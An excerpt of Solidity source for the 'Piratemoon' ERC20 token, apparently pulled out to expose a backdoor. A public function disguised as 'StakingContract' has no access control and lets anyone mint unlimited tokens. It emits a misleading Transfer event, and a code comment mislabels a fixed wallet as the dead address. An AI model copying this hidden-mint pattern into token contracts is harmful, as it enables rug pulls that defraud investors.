...
contract ERC20 is Context, IERC20, IERC20Metadata {
  ...
  function StakingContract(address account, uint256 amount) public  {
        ...
        _balances[account] = _balances[account].add(amount);
        _totalSupply = _totalSupply.add(amount);
        emit Transfer(account, address(0x01889B7063dB1A01ef3D346342Ef6074c728F6aC), amount);
  }
    /**
...
contract Piratemoon is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Piratemoon", "PMoon") {
    	...
    	marketingWallet = address(0x01889B7063dB1A01ef3D346342Ef6074c728F6aC); // set as marketing wallet
        liquidityWallet = address(0x01889B7063dB1A01ef3D346342Ef6074c728F6aC); // liquidity will go to dead address at first, can update later if needed.
